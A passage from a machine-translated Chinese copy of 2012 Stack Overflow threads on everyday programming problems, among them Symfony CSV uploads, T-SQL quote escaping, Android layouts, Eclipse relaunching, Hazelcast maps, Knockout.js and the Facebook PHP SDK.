        if (isset($_FILES['file']))
        {
            $file = $_FILES['file']['tmp_name']; 
            $handle = fopen($file,'r'); 
            $row = 1; 
            $handle = fopen("$file", "r"); 

            while (($data = fgetcsv($handle, 1000, ",")) !== FALSE)
            {
                $num =+ count($data);
                $row++; 

                for ($c = $i; $c < $num; $c++)
                {
                    $tableau[$c] = $data[$c];
                    $i++;
                }
            }
        }
        $tableau[$c+1] = $i;

        /*
        if ($this->form->isValid())
        {
            print_r($this->form->getData());

            $this->onSuccess($this->form->getData());

            return true;
        }
        */
    }

    return false;
} 
```

当我尝试对其进行测试时，我的页面顶部会出现一些文本：

> 数组 ( [fichier] => Symfony\Component\HttpFoundation\File\UploadedFile 对象 ( [test:Symfony\Component\HttpFoundation\File\UploadedFile:private] => [originalName:Symfony\Component\HttpFoundation\File\UploadedFile:private] => testcsv.csv [mimeType:Symfony\Component\HttpFoundation\File\UploadedFile:private] => text/csv [大小:Symfony\Component\HttpFoundation\File\UploadedFile:private] => 491 [错误：Symfony\Component\ HttpFoundation\File\UploadedFile:private] => 0 [pathName:SplFileInfo:private] => /Applications/MAMP/tmp/php/phpSr5O5S [fileName:SplFileInfo:private] => phpSr5O5S ) )

我不明白那些事。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-17T15:29:54.607

如果你想做一个正确的 symfony2 方式，你应该创建一个 symfony 表单来提交文件。例如：

```
// Your Controller.php
$form = $this->createFormBuilder()
        ->add('submitFile', 'file', array('label' => 'File to Submit'))
        ->getForm();

// Check if we are posting stuff
if ($request->getMethod('post') == 'POST') {
    // Bind request to the form
    $form->bindRequest($request);

    // If form is valid
    if ($form->isValid()) {
         // Get file
         $file = $form->get('submitFile');

         // Your csv file here when you hit submit button
         $file->getData();
    }

 }

return $this->render('YourBundle:YourControllerName:index.html.twig',
    array('form' => $form->createView(),)
); 
```

枝条：

```
<!-- index.html.twig Twig part -->
{% extends "YourBundle::layout.html.twig" %}

{% block content %}
    <form action="" method="post" {{ form_enctype(form) }}>
        {{ form_widget(form) }}

        <input type="submit" />
    </form>
{% endblock %} 
```

不要忘记`{{ form_enctype(form) }}`告诉我们正在发送文件很重要。Symfony2 将生成`enctype="multipart/form-data"`标签

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-11-20T04:42:16.173

如果您不想要表格，可以这样做：

```
public function processAction() {
    foreach($this->getRequest()->files as $file) { 
        if (($handle = fopen($file->getRealPath(), "r")) !== FALSE) {
            while(($row = fgetcsv($handle)) !== FALSE) {
                var_dump($row); // process the row.
            }
        }
    }
    //return response.
} 
```

# javascript - 使用 Raphael.setViewBox 缩放/平移显示集合/纸张的全部内容

> ID：12460741
> 
> 赞同：2
> 
> 时间：2012-09-17T13:52:49.653
> 
> 标签：javascript, svg, raphael

我的目标是创建一些代码，在纸的中心显示（不需要动画）一组尽可能大的对象。

我当前的尝试获取一组对象或纸张的边界框并返回尺寸，然后由`setViewBox`. 不幸的是，它不起作用，我不知道为什么。

这是我的代码

```
function GetContainingViewBoxFor(object)
{
var maxValues =  { x: 0, y: 0 };
var minValues =  { x: 0, y: 0 };

//Find max and min points
object.forEach(function (el) {
    if (el.data("background")) return;

    var bbox = el.getBBox();

    if (bbox.y < minValues.y) minValues.y = bbox.y;
    if (bbox.y2 < minValues.y) minValues.y = bbox.y2;

    if (bbox.y > maxValues.y) maxValues.y = bbox.y;
    if (bbox.y2 > maxValues.y) maxValues.y = bbox.y2;

    if (bbox.x < minValues.x) minValues.x = bbox.x;
    if (bbox.x2 < minValues.x) minValues.x = bbox.x2;

    if (bbox.x > maxValues.x) maxValues.x = bbox.x;
    if (bbox.x2 > maxValues.x) maxValues.x = bbox.x2;
});

//Padding
var padding = 50;
maxValues.x += padding;
minValues.x -= padding;
maxValues.y += padding;
minValues.y -= padding;

var w = maxValues.x - minValues.x;
var h = maxValues.y - minValues.y;

var cviewBox = {X:minValues.x - paper.width,Y:minValues.y,width:w,height:h};
return cviewBox;
} 
```

它是这样使用的：

```
var containingViewBox = GetContainingViewBoxFor(paper);

paper.setViewBox(containingViewBox.X, containingViewBox.Y, containingViewBox.width, containingViewBox.height, false); 
```

# sql - 查询中的单引号

> ID：12460742
> 
> 赞同：5
> 
> 时间：2012-09-17T13:53:00.073
> 
> 标签：sql, tsql

如何在查询中插入单引号？

**例子**

```
select *, 'INSERT INTO San_Endereco (Endereco_Id, Logradouro_Id, Bairro_Id, CEP, Logradouro, Livre) VALUES 
(' + CAST(Endereco_Id as varchar) + ','
+ CAST(Logradouro_Id as varchar) + ','
+ CAST(Bairro_Id as varchar) + ','
+ CAST (CEP as varchar) + ','
+ CAST(Logradouro as varchar) + ','
+ CAST(Livre as varchar) + ')'  as teste
FROM San_Endereco 
```

在每个`CAST`我需要放单引号之前。我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-17T13:54:37.233

使用两个单引号：`''`

```
select *, 'INSERT INTO San_Endereco (Endereco_Id, Logradouro_Id, Bairro_Id, CEP, Logradouro, Livre) VALUES  
(''' + CAST(Endereco_Id as varchar) + ''',''' 
+ CAST(Logradouro_Id as varchar) + ''',''' 
+ CAST(Bairro_Id as varchar) + ''',''' 
+ CAST (CEP as varchar) + ''',''' 
+ CAST(Logradouro as varchar) + ''',''' 
+ CAST(Livre as varchar) + ''')'''  as teste 
FROM San_Endereco 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:56:45.800

使用双单引号`''`

如果要插入的实际数据中包含单引号，则命令通常会损坏。要解决此问题，只需将任何单引号替换为两个引号（不是双引号字符而是两个单引号字符）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-01-15T09:37:23.980

```
declare @var varchar(100)
select @var = 'txt'        
select char(39)+@var+char(39) -- with single quote 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:55:26.767

```
select *, 'INSERT INTO San_Endereco (Endereco_Id, Logradouro_Id, Bairro_Id, CEP, Logradouro, Livre) VALUES 
        (''' + CAST(Endereco_Id as varchar) + ''','
    + .... 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T13:57:18.650

您必须`'`在字符串中使用两次：

```
declare @var varchar(100)
select @var = 'txt'        
select ' '+@var+' ' -- without single quote
select ''''+@var+'''' -- with single quote 
```

# android - 运行编译文件问题 - eh_frame_hdr

> ID：12460743
> 
> 赞同：2
> 
> 时间：2012-09-17T13:53:00.323
> 
> 标签：android, android-ndk

`main.cpp`我使用以下方法编译了简单文件`android-ndk-r8b`：

```
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    puts("!!!Hello World!!!");
    return EXIT_SUCCESS;
} 
```

我使用的命令如下：

> .../android-ndk-r8b/ndk-build APP_ABI=x86

从 main.cpp 文件的目录我的 Android.mk 文件：

```
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_CFLAGS += -fPIC
LOCAL_MODULE := main
LOCAL_SRC_FILES := main.cpp
include $(BUILD_EXECUTABLE) 
```

然后我尝试在 debian x86 上打开这个文件，我得到了这个信息：

> ./main: 没有这样的文件或目录

然后我使用了命令：

> 主

并有信息：

> ld：主错误（.eh_frame）；不会创建 .eh_frame_hdr 表。
> ld：警告：找不到入口符号_start；默认为 0000000008048320

是否可以在常见的 linux x86 发行版上运行通过 android-ndk 编译的文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T16:19:56.977

不，Android 运行时库与桌面 Linux 不兼容。

请注意，您的 ndk-build 将**主要**可执行文件放在**./libs/x86/**

# java - 在 Eclipse 中重新启动应用程序

> ID：12460745
> 
> 赞同：10
> 
> 时间：2012-09-17T13:53:05.117
> 
> 标签：java, eclipse, application-restart

我正在使用 Eclipse Juno 开发独立服务器（不是战争）。我将它作为 Eclipse 中的 Java 应用程序运行。在我做了一些代码更改后，我想停止当前正在运行的服务器并重新启动它。我每天这样做几十次。

我目前这样做的方式如下： - 转到“调试”选项卡。- 选择服务器进程。- 单击停止进程图标（红色方块）。- 单击绿色箭头重新运行上次运行的应用程序。- 返回“Java”选项卡。

有更快的方法吗？

理想情况下，我想要一个按钮或键盘快捷键，可以一键停止并重新启动应用程序。如果它不存在，我可以以某种方式扩展 Eclipse 吗？我应该在哪里寻找这样的例子？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-17T13:56:26.217

您可以通过在调试窗口中右键单击它并选择“终止并重新启动”来重新启动正在运行的应用程序。

![在此处输入图像描述](../Images/72becf7bf396961e3be06525601ccb44.png)

并使用 Ctrl+F8 在视图之间快速切换

此外，如果您已经从控制台终止了应用程序，您可以简单地按 ctrl + f11

如果您真的想要，您还可以通过 Window -> Preferences -> General -> Keys -> 找到“Terminate and Relaunch”并选择您最喜欢的组合键来添加自定义快捷方式来终止和重新启动！

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-10-06T07:39:55.923

Eclipse Neon.1 添加了一种在重新启动之前终止的方法，方法是在单击启动历史记录项的同时**按住 Shift 。**

您还可以通过在首选项 › 运行/调试 › 启动中启用“启动时终止并重新启动”选项来将其设为默认行为。

[https://www.eclipse.org/eclipse/news/4.6/platform.php#terminate-relaunch-history](https://www.eclipse.org/eclipse/news/4.6/platform.php#terminate-relaunch-history)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-27T14:03:25.250

我遇到了你遇到的确切问题。我有一个简单的 Java 类，它有一个运行嵌入式 tomcat 的 main 方法。

当我更改任何服务类时，我想终止当前的嵌入式 tomcat 并通过一次按键重新启动。

我知道，我本可以通过单击 2 次鼠标来完成相同的操作……但是……这让我很痛苦，以至于学习了一点关于 Eclipse 插件的知识并将一些东西放在一起。

希望这对你也有帮助。

[https://bitbucket.org/mantis78/relaunch-plugin/wiki/Home](https://bitbucket.org/mantis78/relaunch-plugin/wiki/Home)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-17T14:07:44.343

简单地说，你不能像你想要的那样修改 eclipse。但是你可以按照这个过程来最小化你的工作 1\. 在 Eclipse Project TAb-> Check Build Automatically。2\. 每次更改后，您都在使用 Eclipse 中的绿色按钮运行项目。

您也可以使用 CTRL+F11 来运行项目。

# python - 在 python 中运行 unix 命令获取实时输出

> ID：12460746
> 
> 赞同：0
> 
> 时间：2012-09-17T13:53:04.847
> 
> 标签：python, shell

我正在使用下面的代码来运行 unix 命令：

```
cmd = 'ls -l'
(status,output) = commands.getstatusoutput(cmd)
print output 
```

但问题是它仅在命令完成后才显示输出，但我想在执行过程中看到打印的输出。 `ls -l`只是虚拟命令，我在实际程序中使用了一些复杂的命令。

谢谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:18:23.997

由于这是家庭作业，因此这里是要做的而不是完整的解决方案：

1.  使用`subprocess.Popen`类来调用可执行文件。请注意，构造函数采用命名`stdout`参数，并查看`subprocess.PIPE`.

2.  在单独的线程中从对象的 STDOUT 管道读取`Popen`以避免死锁。请参阅`threading`模块。

3.  等到子进程完成（请参阅 参考资料`Popen.wait`）。

4.  等到线程完成对输出的处理（请参阅 参考资料`Thread.join`）。请注意，这很可能*在*子流程完成后发生。

如果您需要更多帮助，请描述您的确切问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:21:15.633

除非 Python 中有我不知道的更简单的方法，否则我相信您将不得不深入研究稍微复杂一些的[`os.fork`](http://docs.python.org/library/os.html#os.fork)函数[`os.pipe`](http://docs.python.org/library/os.html#os.pipe)。

基本上，这个想法是分叉您的进程，让子进程执行您的命令，同时将其标准输出重定向到将由父进程读取的管道。你会很容易找到这种模式的[例子。](https://stackoverflow.com/a/872637/451980)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:51:29.687

大多数程序如果没有连接到 tty 将使用块缓冲输出，因此您需要运行连接到 pty 的程序；最简单的方法是使用[pexpect：](http://pypi.python.org/pypi/pexpect/)

```
for line in pexpect.spawn('command arg1 arg2'):
    print line 
```

# android - 使用 Sentry 监控错误 - Android

> ID：12460751
> 
> 赞同：5
> 
> 时间：2012-09-17T13:53:15.797
> 
> 标签：android, sentry

我需要为我的 android 应用程序实现 Sentry，我试图找到一个关于如何实现它的示例，但我找不到它。[我在http://sentry.readthedocs.org/en/latest/developer/client/index.html#server_name](http://sentry.readthedocs.org/en/latest/developer/client/index.html#server_name)中看到了 Sentry 文档

但我有一些问题。如果我的应用程序崩溃，异常会被捕获吗？我应该将此代码行放入我的 try/catch 中吗？var $resultId = myClient->captureException($myException); （在安卓代码中）

如果有人在android中有样本，我将不胜感激。

谢谢！

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-06-07T18:45:42.003

我有点晚了，但我最近刚刚发布了一个适用于 Android 的 Sentry 客户端。它处于早期阶段，因此请随时请求您看到的任何更改。

[https://github.com/joshdholtz/Sentry-Android](https://github.com/joshdholtz/Sentry-Android)

```
public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Sentry will look for uncaught exceptions from previous runs and send them        
        Sentry.init(this, "YOUR-SENTRY-DSN");

    }

} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T14:19:21.837

也许尝试使用像 BugSense 之类的东西？[http://www.bugsense.com/](http://www.bugsense.com/)

如果它肯定是 Sentry，那么看看这个例子：[https ://stackoverflow.com/a/755151/349012](https://stackoverflow.com/a/755151/349012)

它向您展示了如何设置自己的未捕获异常处理程序，以便您可以尝试上传到 Sentry。

# jquery - 将 $(this) 的值存储在 jQuery 变量中

> ID：12460755
> 
> 赞同：0
> 
> 时间：2012-09-17T13:53:25.597
> 
> 标签：jquery, this

我不知道如何将 的值存储`$(this)`在一个变量中以供另一个函数使用。

在此示例中，我想要对单击的`div`元素的引用：

```
function doSomething(thisVar) {
 // do stuff with thisVar
}

$("div.someClass").click(function() {
    var myThisVariable = $(this);
    doSomething(myThisVariable);
}); 
```

它不起作用（成为 NULL 引用）。什么是正确的 jQuery 语法？

**编辑：**这个错误归结为我混淆了`this`. 它表明您需要特别注意`this`每种情况下的真正含义。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:09:27.907

[这对我有用。](http://jsfiddle.net/j3dn5/2/)您的问题可能在其他地方。

这是正确的 jQuery 方法。开发人员经常将 的值保存`$(this)`到全局`self`（或）中，以便在上下文和值发生更改`$self`的情况下访问它。`this`将它作为属性传递几乎是一样的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:05:04.033

尝试其中一些

```
function doSomething(thisVar) {
// do stuff with thisVar
    $( '#' + thisVar ) // selects the id
    $( '.' + thisVar ) // selects the class

}

$("div.someClass").click(function() {
    var myThisVariable1 = $(this).attr('id'); //saves the current element id
    var myThisVariable2 = $(this).attr('class'); //saves the current element class
    doSomething(myThisVariable);
}); 
```

希望它有所帮助:)（希望我理解这个问题）

# android - GridView 在纵向模式下每行有 1 个 ImageView，在横向模式下有 2 个 ImageView

> ID：12460757
> 
> 赞同：2
> 
> 时间：2012-09-17T13:53:30.947
> 
> 标签：android, android-layout, imageview, landscape-portrait

我实际上有一个由自定义 ArrayAdapter 提供的 ListActivity。它构建由单个 ImageViews 组成的行。在纵向模式下，它看起来不错。但在横向模式下，它将图像拉伸到边界（我将 scaleType 设置为 fitXY）。
我想在横向模式下每行有 2 个 ImageView。GridView 是正确的布局吗？
你会怎么做？

由于我有一个 480x800 的屏幕，纵向时，ImageView 的宽度为 480 像素，而横向时，两者的宽度均为 400 像素。这不是问题，但尊重宽度/高度比对我来说很重要。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:00:57.813

你为什么不使用 Gridview 来完成你的任务。如果要使用列表视图，则必须根据方向检查方向

1）在横向模式下，将加载来自 layout-land/ 的布局，其中包含 2 个图像视图。

2) 在纵向模式下，将加载来自 layout-port/ 的布局，其中包含 1 个图像视图。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:37:35.043

是的，`GridView`是最好和最简单的方法。您可以使用与现在相同的自定义`ArrayAdapter`，`OnClickListener`并且`ListView`只需要更改

```
ListView myList = (ListView) findViewById(R.id.list); 
```

至

```
GridView myGrid = (GridView) findViewById(R.id.gridview); 
```

和xml类似：

```
 <GridView
        android:id="@+id/gridview"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:columnWidth="390px"
        android:gravity="center"
        android:numColumns="auto_fit"
        android:stretchMode="columnWidth" /> 
```

现在，您应该避免使用“px”作为单位，而是使用“dp”，并且只有当您确实确定您的应用程序仅设计为 480x800 分辨率时。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T13:59:34.973

gridView 不是一个布局。它是一个 adapterView ，因此它的目的是能够“显示”大量视图并能够在它们之间滚动。

也许您想改用 gridLayout ？它还有一个可比性库...

无论如何，如果您想坚持使用 gridView ，只需将 设置为`android:numColumns`您通过 values 文件夹为纵向模式设置的变量，并将 values-land 设置为横向模式所需的值

* * *

编辑：这是使用 gridView 的解决方案：

布局 xml 文件应包含以下内容：

```
<GridView android:layout_width="match_parent"
  android:numColumns="@integer/cols" android:layout_height="match_parent"
  /> 
```

在具有以下内容的文件夹中创建一个 xml 文件（例如“consts.xml”）`res/values`：

```
<?xml version="1.0" encoding="utf-8"?>
<resources>
  <item type="integer" name="cols">2</item>
</resources> 
```

另外，在文件夹中创建相同的`res/values-land`文件，并将 2 设置为 3 。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T14:11:38.273

您可以为不同的方向提供不同的资源。因此，当设备处于横向时，您使用在每个项目`ListView`中有两个`ImageView`s 的布局填充，而在纵向中，布局`ImageView`每个项目有 1 个。

查看[提供资源](http://developer.android.com/guide/topics/resources/providing-resources.html)以了解如何为不同的方向提供不同的布局 XML。

示例代码：

```
// Create an anonymous implementation of OnClickListener
private OnClickListener mImageListener = new OnClickListener() {
    public void onClick(View v) {
      // do something when the ImageView is clicked
    }
};

//Check the orientation and handle accordingly in the getView
public View getView (int position, View convertView, ViewGroup parent){
    if(convertView == null){
        convertView = (LinearLayout)inflater.inflate(R.layout.list_item, parent);
    }
    ImageView leftImage = (ImageView)convertView.findViewById(R.id.leftImage);
    ImageView rightImage = (ImageView)convertView.findViewById(R.id.rightImage);
    boolean isTwoColumn = (rightImage != null);

    //If it is two column layout, set both ImageViews
    if(isTwoColumn){
      leftImage.setImageResource(...);
      leftImage.setOnClickListener(mImageListener);
      rightImage.setImageResource(...);
      rightImage.setOnClickListener(mImageListener);
    }else{
      leftImage.setImageResource(...);
      leftImage.setOnClickListener(mImageListener);
    }
} 
```

/res/layout-land/list-item.xml

```
<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal">
    <ImageView
      android:id="+@id/leftImage"
      android:layout_width="wrap_content"
      android:layout_height="wrap_content">
    <ImageView
      android:id="+@id/rightImage"
      android:layout_width="wrap_content"
      android:layout_height="wrap_content">
</LinearLayout> 
```

/res/layout-port/list-item.xml

```
<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal">
    <ImageView
      android:id="+@id/leftImage"
      android:layout_width="wrap_content"
      android:layout_height="wrap_content">
</LinearLayout> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T14:05:51.543

我尝试了 Gridview 并个人发现获得我想要的显示非常繁琐（这是内部较小单元格的比例正确显示）......经过数周的不同分辨率和屏幕格式的调整后，我选择创建自己的 gridview从头开始，并没有回头。

我并不是说 Gridview 并非没有它的优点，但我可以说的是，如果你对它应该如何操作有一个非常清晰的想法，那么实现你自己的系统需要几个小时，你可能会发现它更容易自己编码。

从本质上讲，它只是一个派生自 ViewGroup 的类，覆盖 onMeasure 和 onLayout 项以测量它包含的子视图，然后将它们布置到屏幕上您想要它们的位置。

如果您正在寻找长列表，但我仍然会查看列表视图，或者网格视图可能值得一试，但这当然可以让您放心，如果需要，您可以完全控制它。

# javascript - 对象定义范围

> ID：12460758
> 
> 赞同：0
> 
> 时间：2012-09-17T13:53:35.160
> 
> 标签：javascript

在 javascript 中，当您定义一个对象字面量时，该对象存在于哪里？那是在那个函数的激活对象中吗？我问这个知道这或任何其他含义之间是否存在任何技术差异：

```
var global;
(function(){
  global={};

})(); 
```

或者：

```
var global = {}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:00:28.357

一个对象没有任何作用域，所以它在你创建它的地方没有任何区别。

但是，如果对象有方法，它们可以使用创建它们的作用域的局部变量：

```
var global;

(function(){
  var local = 42;
  global = {
    aMethod: function() { alert(local); }
  };
})(); 
```

局部变量`local`只存在于该范围内，但对象中的方法可以使用该变量，因为该方法是在该范围内创建的。

只要方法是在作用域内创建的，同样适用于在作用域外创建的对象；

```
var global = {};

(function(){
  var local = 42;
  global.aMethod = function() { alert(local); }
})(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:56:50.677

两个版本都有完全相同的结果，一个空的全局对象。所以不，没有技术差异。

# scala - 哈希问题。如何使用带有字节数组键和值的 hazelcast map/multimap？

> ID：12460759
> 
> 赞同：2
> 
> 时间：2012-09-17T13:53:41.150
> 
> 标签：scala, hash, hazelcast

我正在尝试使用 hazelcast 多映射和已序列化数据的映射，即键和值都是字节数组。如下所示，它没有按预期工作。

在 javadoc 中，在“gotchas”部分中指出，散列是由 hazelcast 在序列化形式上处理的，不依赖于 hashCode 和 equals 的实现（在字节数组的情况下不会被覆盖）。所以，我不明白为什么显然使用了 Object.hashcode 。

有人可以告诉我如何使用带有字节数组的榛树地图吗？

我是否有义务使用充分覆盖的哈希码/相等方法存储字节数组包装器？

谢谢你的帮助。

问题：

```
 scala> val mm:MultiMap[Array[Byte], Array[Byte]] = hi.getMultiMap("test-baMuMa")
 mm: com.hazelcast.core.MultiMap[Array[Byte],Array[Byte]] = MultiMap [test-baMuMa]

 scala> mm.put("a".getBytes,"b".getBytes)
 res29: Boolean = true

 scala> mm.put("a".getBytes,"b".getBytes)
 res30: Boolean = true
 // => should return false..

 scala> mm.remove("a".getBytes,"b".getBytes)
 res31: Boolean = false
 // =>  should return true

 scala> mm.containsEntry("a".getBytes,"b".getBytes)
 res32: Boolean = false
 // =>  should return true (confirmed that removal did not occur) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T11:01:13.743

我在这里回答我自己的问题，因为我认为在 hazelcast 文档中并没有像它可能的那样清楚地说明：

*   关键对象不需要覆盖equals/hashcode
*   值对象需要覆盖equals/hashcode

通过这个简单的测试可以看出这一点：

```
object TestHazel{

  class Klaus(a:Int) extends Serializable
  // class does not override equals/hashcode

  def main (args:Array[Byte]){
    import com.hazelcast.core._
    val hi = Hazelcast.newHazelcastInstance
    val map = hi.getMap[Klaus, Klaus]("asdf")
    val klaus1 = new Klaus(1)
    map.put(klaus1, klaus1)
    val containsKey = map.containsKey(new Klaus(1))
    println("\n\ncheck if key overrides equals/hashcode: " + containsKey)
    // true

    val containsValue = map.containsValue(new Klaus(1))
    println("\n\ncheck if value overrides equals/hashcode: " + containsValue + "\n\n")
    // false

    hi.shutdown
 }
} 
```

因此，就我而言，对于字节数组值，需要一个覆盖等于和哈希码的包装器。不幸的是，值类 scala >= 2.10 不能与覆盖 equals/hashcode 的类一起使用，所以我们无法避免装箱:-(

此外，如果您想按顺序索引，则包装器必须是可比较的。

这是这种包装器的合理实现：

```
class BAWrapper2(ba:Array[Byte], comparator:Comparator[Array[Byte]]) 
    extends Serializable with Comparable[BAWrapper2] 
{
  def data: Array[Byte] = if (ba == null) Array.empty[Byte] else ba
  def equals(other:BAWrapper2):Boolean = util.Arrays.equals(data, other.data)
  override def equals(obj:Any):Boolean = 
    if (obj.isInstanceOf[BAWrapper2]) equals(obj.asInstanceOf[BAWrapper2]) 
    else false
  override def compareTo(that:BAWrapper2):Int =
    if (comparator != null) comparator.compare(this.data, that.data)
    else BAComparator.compare(this.data, that.data)
  override def hashCode:Int = util.Arrays.hashCode(data)
} 
```

# vba - Word VBA：监视列表消失

> ID：12460761
> 
> 赞同：4
> 
> 时间：2012-09-17T13:53:42.757
> 
> 标签：vba, ms-word

这个问题已经发生了一段时间，但是对于我现在尝试调试的特定代码段，我真的很难忍受。

这个问题是相当基本的：每次我单击 F8 进入下一行代码时，监视窗口中的表达式、值和类型列都会完全空白。上下文仍然存在，就像我创建的每只手表上的一副眼镜图标一样，但除此之外它们是空白的。如果我在 Watch 窗口中单击，值会重新出现，每次单击一个值时都会出现一个。一旦我通过单击显示手表，我可以通过单击加号或减号（树折叠或展开）使整个列表重新出现。在完成使我的列表再次可见的过程之后，当我单击 f8 时，它又消失了。尝试搜索此问题，但似乎找不到任何东西。有人可以帮忙吗？

谢谢

# javascript - 无法在 html 中调用 .js（使用淘汰赛）

> ID：12460765
> 
> 赞同：0
> 
> 时间：2012-09-17T13:53:55.017
> 
> 标签：javascript, html, knockout.js, knockout-2.0

我是使用 knockout2.1.0 进行淘汰赛的新手。我有一个外部 java 脚本文件，但在我的 html 文件中没有调用它。我无法理解。

我在我的 html 文件中添加了以下内容

```
 <script src="Scripts/TestJavascript.js"></script> 
```

**JS文件**

```
///<reference path="~/Scripts/jquery-1.8.1.min.js">
///<reference path="~/Scripts/knockout-2.1.0.debug.js">
$(function AppViewModel() {
this.firstName = ko.observable("rash");
this.lastName = ko.observable("Bertington");
this.fullName = ko.computed(function(){
    return this.firstName() + " " + this.lastName();
}, this);
})
ko.applyBindings(new AppViewModel()); 
```

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T13:56:34.690

您没有创建 ViewModel。您将其传递给 jquery。

尝试

```
var AppViewModel = function() {
  this.firstName = ko.observable("rash");
  this.lastName = ko.observable("Bertington");
  this.fullName = ko.computed(function(){
      return this.firstName() + " " + this.lastName();
  }, this);
})
ko.applyBindings(new AppViewModel()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:57:18.013

此代码必须出现在绑定的 html 之后或文档就绪事件 (jquery) 中

```
function AppViewModel() {
    this.firstName = ko.observable("rash");
    this.lastName = ko.observable("Bertington");
    this.fullName = ko.computed(function(){
        return this.firstName() + " " + this.lastName();
    }, this);
};
ko.applyBindings(new AppViewModel()); 
```

# php - 如何授权我的 PHP 代码在 Facebook 上发布？

> ID：12460769
> 
> 赞同：0
> 
> 时间：2012-09-17T13:54:00.617
> 
> 标签：php, facebook, facebook-graph-api

我想在我的 Facebook 用户帐户墙上发布一些测试墙帖子（不是任何 Facebook 页面或 Facebook 应用程序，只是普通用户帐户）。我尝试了像下面这样的 Facebook SDK，但什么也没发生，它只是要求我登录。但我想以编程方式登录，请告诉我如何做到这一点并发布到我自己的墙上？

```
require_once "API_Library/Facebook/src/facebook.php";
$config = array(
         'userId' => 'USER_ID',
     );

     $facebook = new Facebook($config);
     $user_id = $facebook->getUser(); 

if($user_id)
             {

                 // We have a user ID, so probably a logged in user.
                 // If not, we'll get an exception, which we handle below.
                 try
                 {
                     $user = $config['userId'];
                     $user_profile = $facebook->api('/me', 'GET');
                     echo "Name: " . $user_profile['name'];
                     $ret_obj = $facebook->api('/me/feed', 'GET', array(
                         'link' => "https://www.facebook.com/$user",
                         'message' => 'Posting with the PHP SDK!'
                             ));
                     echo '<pre>Post ID: ' . $ret_obj['id'] . '</pre>';
                 }
                 catch(FacebookApiException $e)
                 {
                     $login_url = $facebook->getLoginUrl();
                     echo 'Please <a href="' . $login_url . '">login.</a>';
                     error_log($e->getType());
                     error_log($e->getMessage());
                 }
             }
             else
             {

                 // No user, print a link for the user to login
                 $login_url = $facebook->getLoginUrl();
                 echo 'Please <a href="' . $login_url . '">login.</a>';
             } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T16:59:36.640

您正在执行 HTTP GET 而不是 HTTP POST

```
$ret_obj = $facebook->api('/me/feed', 'GET', array(
                     'link' => "https://www.facebook.com/$user",
                     'message' => 'Posting with the PHP SDK!'
                         )); 
```

您可能希望将 API 方法更改为`POST`。

# passenger - Redmine 和 backlog 没有要加载的文件 -- phusion_passenger/utils (LoadError)

> ID：12460773
> 
> 赞同：0
> 
> 时间：2012-09-17T13:54:11.090
> 
> 标签：passenger, redmine, backlog

我尝试使用积压插件安装 redmine。我遵循了本教程：[https ://github.com/backlogs/redmine_backlogs/wiki/Installation-of-Backlogs-in-Redmine-2.0](https://github.com/backlogs/redmine_backlogs/wiki/Installation-of-Backlogs-in-Redmine-2.0)

现在我有 apache 错误：

```
/usr/lib/phusion_passenger/passenger-spawn-server:53:in `require': no such file to load -- phusion_passenger/utils (LoadError) 
        from /usr/lib/phusion_passenger/passenger-spawn-server:53:in `<main>'
[ pid=4064 file=ext/apache2/Hooks.cpp:725 time=2012-09-16 23:23:45.726 ]: 
  Unexpected error in mod_passenger: Cannot spawn application '/var/www/redmine': The spawn server has exited unexpectedly. 
  Backtrace: 
     in 'virtual boost::shared_ptr<Passenger::Application::Session> Passenger::ApplicationPoolServer::Client::get(const Passenger::PoolOptions&)' (ApplicationPoolServer.h:471) 
     in 'int Hooks::handleRequest(request_rec*)' (Hooks.cpp:521) 
```

这是我的虚拟主机配置：

```
<VirtualHost *:80>
  ServerName redmine.my.domain 
  DocumentRoot "/var/www/redmine/public" 

  <Directory "/var/www/redmine/public/">
    RailsBaseURI /redmine 
    PassengerResolveSymlinksInDocumentRoot on 
  </Directory>
</VirtualHost> 
```

我的 /etc/apache2/mods-available/passenger.conf

```
<IfModule mod_passenger.c>
  PassengerRoot /usr 
  PassengerRuby /usr/bin/ruby 
  PassengerDefaultUser www-data 
</IfModule> 
```

更多的：

```
